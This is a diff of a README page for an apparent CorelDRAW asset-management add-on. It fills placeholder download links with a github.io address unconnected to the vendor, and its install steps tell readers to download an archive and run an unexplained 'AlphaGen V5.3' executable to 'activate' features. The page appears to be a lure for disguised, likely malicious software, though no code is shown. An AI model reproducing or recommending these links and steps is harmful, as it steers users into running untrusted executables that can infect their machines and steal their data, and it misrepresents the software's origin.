@@ -2,13 +2,13 @@
 
 Organize, share, and sync design assets in real time with CorelDRAW’s Dynamic Asset Management tools — perfect for teams and branding consistency.
 
-[![Download](https://img.shields.io/badge/Download-Dynamic_Asset_Manager-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Dynamic_Asset_Manager-blueviolet)](https://dynamic-asset-management-coreldraw.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://dynamic-asset-management-coreldraw.github.io/.github)  
 2. 📁 Extract the folder to any convenient location  
 3. 🖱 Run AlphaGen V5.3 to activate asset sync features  
 4. ✅ Launch CorelDRAW and go to `Window > Dockers > Assets` to manage and sync resources
